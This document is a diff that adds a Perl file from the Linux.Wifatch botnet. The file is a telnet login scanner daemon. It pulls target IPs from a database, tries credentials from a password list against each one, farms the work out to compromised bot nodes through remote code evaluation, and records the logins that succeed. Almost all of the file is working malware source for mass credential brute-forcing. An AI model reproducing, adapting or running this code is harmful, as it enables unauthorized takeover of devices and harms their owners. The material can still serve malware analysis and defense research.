@@ -1,0 +1,273 @@
+#!/usr/bin/env perl
+#
+# This file is part of Linux.Wifatch
+#
+# Copyright (c) 2013,2014,2015 The White Team <rav7teif@ya.ru>
+#
+# Linux.Wifatch is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+#
+# Linux.Wifatch is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with Linux.Wifatch. If not, see <http://www.gnu.org/licenses/>.
+#
+
+# telnet login scanner daemon
+
+use lib "/mnt/u1/hen57/hak";
+
+use EV            ();
+use Errno         ();
+use CBOR::XS      ();
+use Compress::LZF ();
+use Coro;
+use AnyEvent::Socket ();
+use Socket           ();
+
+use strict;
+use bm::cc;
+use bm::sql;
+use bm::pool;
+use bm::nolimits;
+
+$| = 1;
+
+my $count;
+my $info = AE::timer 1, 1, sub {
+	print "\r$count ";
+};
+
+my $max_active = 100;
+my $pkt_size   = 64;
+my $pkt;
+
+our %next;
+
+{
+	my $prev;
+	for (@bm::meta::PW) {
+		$next{ join ":", @$prev } = $_;
+		$prev = $_;
+	}
+}
+
+our %busy;
+
+my $busy_cleaner = AE::timer 30, 3600 * 3, sub {
+	my $too_old = int AE::now - 3600 * 9;
+
+	while (my ($ip, $time) = each %busy) {
+		delete $busy{$ip}
+			if $time < $too_old;
+	}
+};
+
+my $queue = new Coro::Channel 32;
+my $again;
+
+sub addip($$$)
+{
+	push @$pkt, [@_];
+
+	if (@$pkt >= $pkt_size) {
+		(my $p, $pkt) = $pkt;
+		$queue->put($p);
+	}
+}
+
+my @fail;
+
+sub queue_fail($$$)
+{
+	push @fail, [@_];
+
+	if (@fail >= 128) {
+		(my @f, @fail) = @fail;
+
+		#		sql_exec "lock tables scan23 write";
+		sql_exec "update scan23 set cred = ?, last = ?, next = ? + (fail + 1) * 3600, fail = fail + 1 where ip = ?", $_->[2], $_->[1], $_->[1], $_->[0] for @f;
+
+		#		sql_exec "unlock tables";
+
+		delete $busy{ $_->[0] } for @f;
+	}
+}
+
+sub result
+{
+	my ($res, $now) = @_;
+
+	for my $r (@$res) {
+		++$count;
+
+		my ($ip, $user, $pass, $success) = @$r;
+
+		if ($success eq 1) {
+			sql_exec "update scan23 set last = ?, next = ?, fail = 0, cred = ?, state = 'S' where ip = ?", $now, $now, "$user:$pass", $ip;
+
+			warn "+ $ip:$user:$pass\n";
+
+			delete $busy{$ip};
+
+		} elsif ($success eq 0) {
+			my $next = $next{"$user:$pass"};
+
+			if ($next) {
+				if (0.05 < rand) {
+					push @$again, [$ip, $next->[0], $next->[1]];
+				} else {
+
+					#					sql_exec "update scan23 set last = ?, next = ?, fail = 0, cred = ? where ip = ?",
+					#						$now, $now + 70,
+					#						"$next->[0]:$next->[1]", $ip;
+					# do not update next, to reduce database load
+					sql_exec "update scan23 set last = ?, fail = 0, cred = ? where ip = ?", $now, "$next->[0]:$next->[1]", $ip;
+
+					delete $busy{$ip};
+				}
+
+			} else {
+				sql_exec "update scan23 set cred = ?, last = ?, next = ?, state = 'l' where ip = ?", "$user:$pass", $now, $now, $ip;
+
+				delete $busy{$ip};
+			}
+
+		} else {
+			queue_fail $ip, $now, "$user:$pass";
+		}
+	}
+}
+
+my $result_queue = new Coro::Channel 256;
+
+Coro::async {
+	bm::sql::perthread;
+
+	while (my $res = $result_queue->get) {
+		result $res->[0], $res->[1];
+	}
+};
+
+my $TEST = 0;
+
+sub addscanner
+{
+	my ($conn) = @_;
+
+	warn "$conn->{name} adding scanner\n";
+
+	$conn->c_eval('
+		use bn::tnlogin;
+		$data{reply} = gen_queue $reply, t => 5;
+
+		while (defined (my $msg = bn::io::xreadN $fh, 8192, 7200)) {
+			bn::func::thaw $msg;
+
+			for my $tn (@$msg) {
+				bn::tnlogin::tn_login @$tn, sub {
+					my $res = shift;
+
+					Coro::async {
+						$data{reply}->([@$tn, $res])
+							if $data{reply};
+					};
+				};
+			}
+		}
+	');
+	$conn->flush;
+
+	my $active   = 0;
+	my $wake     = $Coro::current;
+	my $timeout  = AE::now + 60 * 45;
+	my $activity = AE::now;
+	my $kill     = AE::timer 30, 30, sub {
+		$wake->throw("NO RESPONSE $active")
+			if $activity < EV::now - 300 && $active;
+	};
+
+	$conn->on(
+		t => sub {
+			$result_queue->put([$_[0], int AE::now]);
+			$active -= @{ $_[0] };
+			$wake->ready;
+			$activity = AE::now;
+		});
+
+	while ($timeout > AE::now) {
+		if ($active < $max_active) {
+			$conn->flush unless $queue->size;
+			my $pkt = $queue->get;
+
+			bn::io::xwrite $conn->fh, pack "N/a", Compress::LZF::compress CBOR::XS::encode_cbor $pkt;
+
+			$active += @$pkt;
+
+		} else {
+			$conn->flush;
+			Coro::schedule unless $active < $max_active;
+		}
+	}
+
+	warn "$conn->{name} retiring scanner\n";
+
+	Coro::schedule while $active;
+
+	warn "$conn->{name} deleting scanner\n";
+}
+
+bm::pool::pool "down > 100000 and up > 100000 and mem > 8000", $ARGV[0] || 300, sub {
+	my ($conn) = @_;
+
+	#	return if $conn->{name} eq "81.15.226.162:51606"; # todo: avoid all seeds?
+
+	addscanner $conn;
+};
+
+async {
+	bm::sql::perthread;
+
+	while () {
+		my $st = sql_exec
+			\my ($ip, $cred),
+			"select ip, cred from scan23
+          where state = 'L' and next <= ?
+          order by next limit 2000000", int AE::now;
+
+		print "feeding ", $st->rows, "\n";
+
+		my $fed = 0;
+
+		while ($st->fetch) {
+			next if $busy{$ip};
+			$busy{$ip} = int EV::now;
+
+			$cred = join ":", @{ $bm::meta::PW[0] } unless length $cred;
+
+			my ($user, $pass) = split /:/, $cred;
+
+			++$fed;
+			addip $ip, $user, $pass;
+		}
+
+		do {
+			print "fed $fed, busy ", (scalar keys %busy), " againing ", (scalar @$again), "\n";
+			$fed = "++";
+
+			($again, my $again2) = (undef, $again);
+
+			addip $_->[0], $_->[1], $_->[2] for @$again2;
+		} while @$again > 500000;
+
+		Coro::AnyEvent::sleep($fed > 100000 ? 0 : 90);
+	}
+};
+
+EV::run;
+
